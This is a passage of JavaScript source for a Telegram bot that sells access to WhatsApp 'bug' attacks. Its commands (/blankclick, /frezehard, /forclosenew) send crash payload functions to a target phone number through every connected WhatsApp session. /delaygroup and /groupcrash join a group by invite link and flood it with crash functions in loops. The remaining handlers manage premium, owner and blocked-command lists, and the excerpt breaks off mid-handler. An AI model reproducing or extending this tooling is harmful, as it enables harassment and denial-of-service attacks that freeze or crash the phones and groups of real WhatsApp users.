bot.onText(/^\/(blankclick)(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const commandName = match[1];
  const userId = msg.from.id;
  const idgc = String(chatId);

  if (!isOwner(userId) && !premiumUsers.includes(userId) && !murbugGC.includes(idgc)) {
    return restricted(chatId);
  }

  if (!match[2]) {
    return sendRichMenu(chatId,
      `<h3>missing target</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/${commandName}</td></tr>
<tr><td>example</td><td>/${commandName} 628123456789</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`,
      msg.message_id
    );
  }

  const [targetNumber] = match[2].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    let allSessions = Array.from(sessions.entries()).filter(([_, data]) => {
      if (data.type === "public") return true;
      if (data.type === "private") return data.ownerId === userId;
      return false;
    });

    if (allSessions.length === 0) {
      return sendRichMenu(chatId,
        `<h3>no sender</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>no bot connected</td></tr>
<tr><td>action</td><td>use /addsenderpublic or /addsenderprivat</td></tr>
</table>`
      );
    }

    if (lastBugTime > 0) {
      const remaining = getRemainingTime();
      if (remaining > 0) {
        return sendRichMenu(chatId,
          `<h3>on delay</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>wait</td><td>${formatDelay(remaining)} more</td></tr>
</table>`
        );
      }
    }

    await sendBugSuccess(chatId, formattedNumber, commandName, msg.message_id);
    updateLastBugTime();

    for (const [botNum, data] of allSessions) {
      const sock = data.sock;
      try {
        if (!sock?.user) continue;
        bug3(sock, target);
        bug3(sock, target);
        const currentDelay = getCurrentDelay();
        if (currentDelay > 0) await new Promise(resolve => setTimeout(resolve, currentDelay));
      } catch (outerError) {
        console.error(`[bot ${botNum}] fatal error:`, outerError);
      }
    }

  } catch (mainError) {
    console.error("main error:", mainError);
    await sendRichMenu(chatId, `<h3>system error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>try again later</td></tr>
</table>`);
  }
});

bot.onText(/^\/(frezehard)(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const commandName = match[1];
  const userId = msg.from.id;
  const idgc = String(chatId);

  if (!isOwner(userId) && !premiumUsers.includes(userId) && !murbugGC.includes(idgc)) {
    return restricted(chatId);
  }

  if (!match[2]) {
    return sendRichMenu(chatId,
      `<h3>missing target</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/${commandName}</td></tr>
<tr><td>example</td><td>/${commandName} 628123456789</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`,
      msg.message_id
    );
  }

  const [targetNumber] = match[2].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    let allSessions = Array.from(sessions.entries()).filter(([_, data]) => {
      if (data.type === "public") return true;
      if (data.type === "private") return data.ownerId === userId;
      return false;
    });

    if (allSessions.length === 0) {
      return sendRichMenu(chatId,
        `<h3>no sender</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>no bot connected</td></tr>
<tr><td>action</td><td>use /addsenderpublic or /addsenderprivat</td></tr>
</table>`
      );
    }

    if (lastBugTime > 0) {
      const remaining = getRemainingTime();
      if (remaining > 0) {
        return sendRichMenu(chatId,
          `<h3>on delay</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>wait</td><td>${formatDelay(remaining)} more</td></tr>
</table>`
        );
      }
    }

    await sendBugSuccess(chatId, formattedNumber, commandName, msg.message_id);
    updateLastBugTime();

    for (const [botNum, data] of allSessions) {
      const sock = data.sock;
      try {
        if (!sock?.user) continue;
        bug4(sock, target);
        bug4(sock, target);
        const currentDelay = getCurrentDelay();
        if (currentDelay > 0) await new Promise(resolve => setTimeout(resolve, currentDelay));
      } catch (outerError) {
        console.error(`[bot ${botNum}] fatal error:`, outerError);
      }
    }

  } catch (mainError) {
    console.error("main error:", mainError);
    await sendRichMenu(chatId, `<h3>system error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>try again later</td></tr>
</table>`);
  }
});

bot.onText(/^\/(forclosenew)(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const commandName = match[1];
  const userId = msg.from.id;
  const idgc = String(chatId);

  if (!isOwner(userId) && !premiumUsers.includes(userId) && !murbugGC.includes(idgc)) {
    return restricted(chatId);
  }

  if (!match[2]) {
    return sendRichMenu(chatId,
      `<h3>missing target</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/${commandName}</td></tr>
<tr><td>example</td><td>/${commandName} 628123456789</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`,
      msg.message_id
    );
  }

  const [targetNumber] = match[2].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    let allSessions = Array.from(sessions.entries()).filter(([_, data]) => {
      if (data.type === "public") return true;
      if (data.type === "private") return data.ownerId === userId;
      return false;
    });

    if (allSessions.length === 0) {
      return sendRichMenu(chatId,
        `<h3>no sender</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>no bot connected</td></tr>
<tr><td>action</td><td>use /addsenderpublic or /addsenderprivat</td></tr>
</table>`
      );
    }

    if (lastBugTime > 0) {
      const remaining = getRemainingTime();
      if (remaining > 0) {
        return sendRichMenu(chatId,
          `<h3>on delay</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>wait</td><td>${formatDelay(remaining)} more</td></tr>
</table>`
        );
      }
    }

    await sendBugSuccess(chatId, formattedNumber, commandName, msg.message_id);
    updateLastBugTime();

    for (const [botNum, data] of allSessions) {
      const sock = data.sock;
      try {
        if (!sock?.user) continue;
        bug5(sock, target);
        bug5(sock, target);
        const currentDelay = getCurrentDelay();
        if (currentDelay > 0) await new Promise(resolve => setTimeout(resolve, currentDelay));
      } catch (outerError) {
        console.error(`[bot ${botNum}] fatal error:`, outerError);
      }
    }

  } catch (mainError) {
    console.error("main error:", mainError);
    await sendRichMenu(chatId, `<h3>system error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>try again later</td></tr>
</table>`);
  }
});

bot.onText(/^\/(delaygroup)(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const commandName = match[1];
  const userId = msg.from.id;
  const idgc = String(chatId);

  if (!isOwner(userId) && !premiumUsers.includes(userId) && !murbugGC.includes(idgc)) {
    return restricted(chatId);
  }

  if (!match[2]) {
    return sendRichMenu(chatId,
      `<h3>missing group link</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/${commandName}</td></tr>
<tr><td>example</td><td>/${commandName} https://chat.whatsapp.com/abcd1234</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`,
      msg.message_id
    );
  }

  const link = match[2].trim();
  const inviteCode = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/)?.[1];
  if (!inviteCode) {
    return sendRichMenu(chatId,
      `<h3>invalid link</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>invalid group link</td></tr>
</table>`,
      msg.message_id
    );
  }

  const allSessions = Array.from(sessions.entries()).filter(([_, data]) => {
    if (data.type === "public") return true;
    if (data.type === "private") return data.ownerId === userId;
    return false;
  });

  if (allSessions.length === 0) {
    return sendRichMenu(chatId,
      `<h3>no sender</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>no bot connected</td></tr>
</table>`
    );
  }

  let groupInfo = null;
  let selectedBot = null;

  for (const [botNum, data] of allSessions) {
    const sock = data.sock;
    if (sock?.user) {
      try {
        groupInfo = await sock.groupGetInviteInfo(inviteCode);
        selectedBot = sock;
        break;
      } catch (e) {
        continue;
      }
    }
  }

  if (!groupInfo || !selectedBot) {
    return sendRichMenu(chatId,
      `<h3>error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>cannot access group</td></tr>
</table>`
    );
  }

  const groupJid = groupInfo.id;
  const groupName = groupInfo.subject || "unknown";
  const announce = groupInfo.announce || false;

  if (announce) {
    return sendRichMenu(chatId,
      `<h3>cannot send</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>reason</td><td>group requires admin permission</td></tr>
</table>`
    );
  }

  let joined = false;
  try {
    await selectedBot.groupAcceptInvite(inviteCode);
    joined = true;
  } catch (e) {
    for (const [botNum, data] of allSessions) {
      const sock = data.sock;
      if (sock === selectedBot) continue;
      if (sock?.user) {
        try {
          await sock.groupAcceptInvite(inviteCode);
          joined = true;
          break;
        } catch (err) {}
      }
    }
  }

  if (!joined) {
    return sendRichMenu(chatId,
      `<h3>failed to join</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>reason</td><td>link expired / group full / blocked</td></tr>
</table>`
    );
  }

  await sendRichMenu(chatId,
    `<h3>group bug sent</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>group</td><td>${groupName}</td></tr>
<tr><td>type</td><td>/${commandName}</td></tr>
<tr><td>status</td><td>done</td></tr>
</table>

<tg-button-row>
  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">script info</tg-button>
  <tg-button type="url" url="${link}" style="primary">group link</tg-button>
</tg-button-row>`
  );

  (async () => {
    for (const [botNum, data] of allSessions) {
      const sock = data.sock;
      if (!sock?.user) continue;
      try {
        for (let i = 0; i < 20; i++) {
          await Promise.allSettled([
            halonyetGB(sock, groupJid).catch(() => {}),          
            halonyetGB(sock, groupJid).catch(() => {}),
            halonyetGB(sock, groupJid).catch(() => {}),
            halonyetGB(sock, groupJid).catch(() => {})
          ]);
          const currentDelay = getCurrentDelay();
          if (currentDelay > 0) await new Promise(resolve => setTimeout(resolve, currentDelay));
        }
      } catch (err) {
        console.error(`bot ${botNum} error:`, err);
      }
    }
  })();
});

bot.onText(/^\/(groupcrash)(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const commandName = match[1];
  const userId = msg.from.id;
  const idgc = String(chatId);

  if (!isOwner(userId) && !premiumUsers.includes(userId) && !murbugGC.includes(idgc)) {
    return restricted(chatId);
  }

  if (!match[2]) {
    return sendRichMenu(chatId,
      `<h3>missing group link</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/${commandName}</td></tr>
<tr><td>example</td><td>/${commandName} https://chat.whatsapp.com/abcd1234</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`,
      msg.message_id
    );
  }

  const link = match[2].trim();
  const inviteCode = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/)?.[1];
  if (!inviteCode) {
    return sendRichMenu(chatId,
      `<h3>invalid link</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>invalid group link</td></tr>
</table>`,
      msg.message_id
    );
  }

  const allSessions = Array.from(sessions.entries()).filter(([_, data]) => {
    if (data.type === "public") return true;
    if (data.type === "private") return data.ownerId === userId;
    return false;
  });

  if (allSessions.length === 0) {
    return sendRichMenu(chatId,
      `<h3>no sender</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>no bot connected</td></tr>
</table>`
    );
  }

  let groupInfo = null;
  let selectedBot = null;

  for (const [botNum, data] of allSessions) {
    const sock = data.sock;
    if (sock?.user) {
      try {
        groupInfo = await sock.groupGetInviteInfo(inviteCode);
        selectedBot = sock;
        break;
      } catch (e) {
        continue;
      }
    }
  }

  if (!groupInfo || !selectedBot) {
    return sendRichMenu(chatId,
      `<h3>error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>cannot access group</td></tr>
</table>`
    );
  }

  const groupJid = groupInfo.id;
  const groupName = groupInfo.subject || "unknown";
  const announce = groupInfo.announce || false;

  if (announce) {
    return sendRichMenu(chatId,
      `<h3>cannot send</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>reason</td><td>group requires admin permission</td></tr>
</table>`
    );
  }

  let joined = false;
  try {
    await selectedBot.groupAcceptInvite(inviteCode);
    joined = true;
  } catch (e) {
    for (const [botNum, data] of allSessions) {
      const sock = data.sock;
      if (sock === selectedBot) continue;
      if (sock?.user) {
        try {
          await sock.groupAcceptInvite(inviteCode);
          joined = true;
          break;
        } catch (err) {}
      }
    }
  }

  if (!joined) {
    return sendRichMenu(chatId,
      `<h3>failed to join</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>reason</td><td>link expired / group full / blocked</td></tr>
</table>`
    );
  }

  await sendRichMenu(chatId,
    `<h3>group bug sent</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>group</td><td>${groupName}</td></tr>
<tr><td>type</td><td>/${commandName}</td></tr>
<tr><td>status</td><td>done</td></tr>
</table>

<tg-button-row>
  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">script info</tg-button>
  <tg-button type="url" url="${link}" style="primary">group link</tg-button>
</tg-button-row>`
  );

  (async () => {
    for (const [botNum, data] of allSessions) {
      const sock = data.sock;
      if (!sock?.user) continue;
      try {
        for (let i = 0; i < 20; i++) {
          await Promise.allSettled([
            anjayGB(sock, groupJid).catch(() => {}),          
            kitow(sock, groupJid).catch(() => {}),
            kicaumania(sock, groupJid).catch(() => {}),
            GbCrash(sock, groupJid).catch(() => {})
          ]);
          const currentDelay = getCurrentDelay();
          if (currentDelay > 0) await new Promise(resolve => setTimeout(resolve, currentDelay));
        }
      } catch (err) {
        console.error(`bot ${botNum} error:`, err);
      }
    }
  })();
});

bot.onText(/^\/blockcmd(?:\s+(on|off))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return restricted(chatId);
  }

  const arg = (match[1] || "").toLowerCase();

  if (arg === "on") {
    blockCmdEnabled = true;
    saveBlockCmd();
    return sendRichMenu(chatId,
      `<h3>blockcmd enabled</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>enabled</td></tr>
<tr><td>effect</td><td>only owner / premium / admin can use</td></tr>
<tr><td>anti kidnap</td><td>active</td></tr>
</table>`
    );
  }

  if (arg === "off") {
    blockCmdEnabled = false;
    saveBlockCmd();
    return sendRichMenu(chatId,
      `<h3>blockcmd disabled</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>disabled</td></tr>
<tr><td>effect</td><td>all users can use the bot</td></tr>
</table>`
    );
  }

  const status = blockCmdEnabled ? "on" : "off";
  await sendRichMenu(chatId,
    `<h3>blockcmd status</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>current</td><td>${status}</td></tr>
<tr><td>on</td><td>lock bot + anti kidnap</td></tr>
<tr><td>off</td><td>open access for public</td></tr>
</table>

<p>use <code>/block /command</code> to block specific commands</p>`
  );
});

bot.onText(/^\/block(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) return restricted(chatId);

  if (!match[1]) {
    return sendRichMenu(chatId,
      `<h3>missing command</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>usage</td><td>/block &lt;command&gt;</td></tr>
<tr><td>example</td><td>/block /start</td></tr>
<tr><td>example</td><td>/block /menu</td></tr>
</table>`,
      msg.message_id
    );
  }

  let cmd = match[1].trim().toLowerCase();
  if (!cmd.startsWith("/")) cmd = "/" + cmd;
  cmd = extractCommand(cmd) || cmd;

  if (PROTECTED_COMMANDS.includes(cmd)) {
    return sendRichMenu(chatId,
      `<h3>cannot block</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>${cmd}</td></tr>
<tr><td>reason</td><td>protected command (owner tools)</td></tr>
</table>`,
      msg.message_id
    );
  }

  if (blockedCommands.includes(cmd)) {
    return sendRichMenu(chatId,
      `<h3>already blocked</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>${cmd}</td></tr>
<tr><td>status</td><td>already in blocklist</td></tr>
</table>`,
      msg.message_id
    );
  }

  blockedCommands.push(cmd);
  saveBlockedCommands();

  await sendRichMenu(chatId,
    `<h3>command blocked</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>${cmd}</td></tr>
<tr><td>status</td><td>successfully blocked</td></tr>
<tr><td>note</td><td>owner / premium / admin can still use</td></tr>
</table>`,
    msg.message_id
  );
});

bot.onText(/^\/unblock(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) return restricted(chatId);

  if (!match[1]) {
    return sendRichMenu(chatId,
      `<h3>missing command</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>usage</td><td>/unblock &lt;command&gt;</td></tr>
<tr><td>example</td><td>/unblock /start</td></tr>
</table>`,
      msg.message_id
    );
  }

  let cmd = match[1].trim().toLowerCase();
  if (!cmd.startsWith("/")) cmd = "/" + cmd;
  cmd = extractCommand(cmd) || cmd;

  if (!blockedCommands.includes(cmd)) {
    return sendRichMenu(chatId,
      `<h3>not blocked</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>${cmd}</td></tr>
<tr><td>status</td><td>not in blocklist</td></tr>
</table>`,
      msg.message_id
    );
  }

  blockedCommands = blockedCommands.filter(c => c !== cmd);
  saveBlockedCommands();

  await sendRichMenu(chatId,
    `<h3>command unblocked</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>${cmd}</td></tr>
<tr><td>status</td><td>successfully unblocked</td></tr>
</table>`,
    msg.message_id
  );
});

bot.onText(/^\/listblock$/i, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) return restricted(chatId);

  if (blockedCommands.length === 0) {
    return sendRichMenu(chatId,
      `<h3>blocked commands</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>no blocked commands</td></tr>
</table>`
    );
  }

  let rowsHtml = "";
  blockedCommands.forEach((cmd, i) => {
    rowsHtml += `<tr><td>${i + 1}</td><td>${cmd}</td></tr>\n`;
  });

  await sendRichMenu(chatId,
    `<h3>blocked commands</h3>
<table border="2">
<tr><th>#</th><th>command</th></tr>
${rowsHtml}
</table>

<p>total: ${blockedCommands.length} commands</p>`
  );
});

bot.onText(/^\/modemurbuggb(?:\s+(on|off))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const arg = match[1];

  try {
    if (msg.chat.type === "private") {
      return sendRichMenu(chatId,
        `<h3>group only</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>this command is for groups only</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`
      );
    }

    const chatMember = await bot.getChatMember(chatId, userId);
    const isAdmin = chatMember.status === 'creator' || chatMember.status === 'administrator';
    const isPremium = premiumUsers.includes(userId);

    if (!isOwner(userId) && !(isPremium && isAdmin)) {
      return sendRichMenu(chatId,
        `<h3>access denied</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>only owner or premium admins</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`
      );
    }

    const idgc = String(chatId);
    const isActive = murbugGC.includes(idgc);

    if (arg === 'on') {
      if (isActive) {
        return sendRichMenu(chatId,
          `<h3>already active</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>this group is already active in murbug mode</td></tr>
</table>`
        );
      }
      murbugGC.push(idgc);
      saveMurbugGC();
      return sendRichMenu(chatId,
        `<h3>murbug added</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>successfully added to murbug whitelist</td></tr>
</table>`
      );
    }

    if (arg === 'off') {
      if (!isActive) {
        return sendRichMenu(chatId,
          `<h3>not active</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>not active in murbug mode</td></tr>
</table>`
        );
      }
      murbugGC = murbugGC.filter(g => g !== idgc);
      saveMurbugGC();
      return sendRichMenu(chatId,
        `<h3>murbug removed</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>removed from murbug whitelist</td></tr>
</table>`
      );
    }

    const statusText = isActive ? "online" : "offline";
    await sendRichMenu(chatId,
      `<h3>murbug status</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>${statusText}</td></tr>
<tr><td>on</td><td>/modemurbuggb on</td></tr>
<tr><td>off</td><td>/modemurbuggb off</td></tr>
</table>`
    );

  } catch (error) {
    console.error("error /modemurbuggb:", error);
    sendRichMenu(chatId,
      `<h3>error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>${error.message}</td></tr>
</table>`
    );
  }
});

bot.onText(/^\/addprem(?:\s(.+))?$/i, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(msg.from.id) && !adminUsers.includes(senderId)) {
        return restricted(chatId);
    }

    if (!match[1]) {
        return sendRichMenu(chatId,
            `<h3>missing input</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/addprem</td></tr>
<tr><td>example</td><td>/addprem 123456789</td></tr>
</table>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`,
            msg.message_id
        );
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return sendRichMenu(chatId,
            `<h3>invalid input</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>example</td><td>/addprem 6843967527</td></tr>
</table>`,
            msg.message_id
        );
    }

    if (!premiumUsers.includes(userId)) {
        premiumUsers.push(userId);
        savePremiumUsers();
        console.log(`${senderId} added ${userId} to premium`);
        sendRichMenu(chatId,
            `<h3>premium added</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>user id</td><td>${userId}</td></tr>
<tr><td>status</td><td>added to premium list</td></tr>
</table>`
        );
    } else {
        sendRichMenu(chatId,
            `<h3>already premium</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>user id</td><td>${userId}</td></tr>
<tr><td>status</td><td>already in premium list</td></tr>
</table>`
        );
    }
});

bot.onText(/^\/addowner(?:\s(.+))?$/i, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(senderId)) {
        return restricted(chatId);
    }

    if (!match[1]) {
        return sendRichMenu(chatId,
            `<h3>missing input</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/addowner</td></tr>
<tr><td>example</td><td>/addowner 123456789</td></tr>
</table>`,
            msg.message_id
        );
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return sendRichMenu(chatId,
            `<h3>invalid input</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>example</td><td>/addowner 6843967527</td></tr>
</table>`,
            msg.message_id
        );
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} added ${userId} to admin`);
        sendRichMenu(chatId,
            `<h3>admin added</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>user id</td><td>${userId}</td></tr>
<tr><td>status</td><td>added as admin</td></tr>
</table>`
        );
    } else {
        sendRichMenu(chatId,
            `<h3>already admin</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>user id</td><td>${userId}</td></tr>
<tr><td>status</td><td>already an admin</td></tr>
</table>`
        );
    }
});

bot.onText(/^\/delprem(?:\s(.+))?$/i, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(msg.from.id) && !adminUsers.includes(senderId)) {
        return restricted(chatId);
    }

    if (!match[1]) {
        return sendRichMenu(chatId,
            `<h3>missing input</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/delprem</td></tr>
<tr><td>example</td><td>/delprem 123456789</td></tr>
</table>`,
            msg.message_id
        );
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (premiumUsers.includes(userId)) {
        premiumUsers = premiumUsers.filter(id => id !== userId);
        savePremiumUsers();
        console.log(`${senderId} deleted ${userId} from premium`);
        sendRichMenu(chatId,
            `<h3>premium removed</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>user id</td><td>${userId}</td></tr>
<tr><td>status</td><td>removed from premium list</td></tr>
</table>`
        );
    } else {
        sendRichMenu(chatId,
            `<h3>not premium</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>user id</td><td>${userId}</td></tr>
<tr><td>status</td><td>not in premium list</td></tr>
</table>`
        );
    }
});

bot.onText(/^\/delowner(?:\s(.+))?$/i, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(msg.from.id) && !adminUsers.includes(senderId)) {
        return restricted(chatId);
    }

    if (!match[1]) {
        return sendRichMenu(chatId,
            `<h3>missing input</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td>/delowner</td></tr>
<tr><td>example</td><td>/delowner 123456789</td></tr>
</table>`,
            msg.message_id
        );
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (adminUsers.includes(userId)) {
        adminUsers = adminUsers.filter(id => id !== userId);
        saveAdminUsers();
        console.log(`${senderId} deleted ${userId} from admin`);
        sendRichMenu(chatId,
            `<h3>admin removed</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>user id</td><td>${userId}</td></tr>
<tr><td>status</td><td>removed from admin list</td></tr>
</table>`
        );
    } else {
        sendRichMenu(chatId,
            `<h3>not admin</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>user id</td><td>${userId}</td></tr>
<tr><td>status</td><td>not in admin list</td></tr>
</table>`
        );
    }
});

bot.onText(/^\/listprem$/, (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(msg.from.id) && !adminUsers.includes(senderId)) {
        return restricted(chatId);
    }

    let rowsHtml = "";
    if (premiumUsers.length === 0) {
        rowsHtml = `<tr><td>-</td><td>no premium users</td></tr>`;
    } else {
        premiumUsers.forEach((id, i) => {
            rowsHtml += `<tr><td>${i + 1}</td><td>${id}</td></tr>\n`;
        });
    }

    sendRichMenu(chatId,
        `<h3>premium user list</h3>
<table border="2">
<tr><th>#</th><th>user id</th></tr>
${rowsHtml}
</table>`
    );
});

bot.onText(/^\/listowner$/, (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!isOwner(msg.from.id) && !adminUsers.includes(senderId)) {
        return restricted(chatId);
    }

    let rowsHtml = "";
    if (adminUsers.length === 0) {
        rowsHtml = `<tr><td>-</td><td>no admins</td></tr>`;
    } else {
        adminUsers.forEach((id, i) => {
            rowsHtml += `<tr><td>${i + 1}</td><td>${id}</td></tr>\n`;
        });
    }

    sendRichMenu(chatId,
        `<h3>admin list</h3>
<table border="2">
<tr><th>#</th><th>user id</th></tr>
${rowsHtml}
</table>`
    );
});

bot.onText(/^\/info(?:\s|$)/i, async (msg) => {
  const target = (msg.reply_to_message && msg.reply_to_message.from)
    ? msg.reply_to_message.from
    : msg.from;

  const fullName = [target.first_name, target.last_name].filter(Boolean).join(" ") || "tanpa nama";
  const usernameText = target.username ? `@${target.username}` : "none";
  const profileUrl = target.username
    ? `https://t.me/${target.username}`
    : `tg://openmessage?user_id=${target.id}`;

  let roleText = "user";
  try {
    const idStr = String(target.id);
    if (isOwner(idStr)) roleText = "owner";
    else if (adminUsers.map(String).includes(idStr)) roleText = "admin";
    else if (premiumUsers.map(String).includes(idStr)) roleText = "premium";
  } catch (e) {}

  const isReply = !!(msg.reply_to_message && msg.reply_to_message.from);

  await sendRichMenu(
    msg.chat.id,
    `<h3>user info${isReply ? " (reply)" : ""}</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>name</td><td>${escapeHtml(fullName)}</td></tr>
<tr><td>username</td><td>${escapeHtml(usernameText)}</td></tr>
<tr><td>id</td><td><code>${target.id}</code></td></tr>
<tr><td>role</td><td>${roleText}</td></tr>
</table>

<tg-button-row>
  <tg-button type="url" url="${profileUrl}" style="primary">telegram profile</tg-button>
</tg-button-row>`,
    msg.message_id
  );
});

bot.onText(/^\/(listsender|listsenderpublic|listsenderprivat|devices)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderid = msg.from.id;
  const command = match[1];

  if (!adminUsers.includes(senderid) && !isOwner(senderid)) {
    return restricted(msg.from.id);
  }

  try {
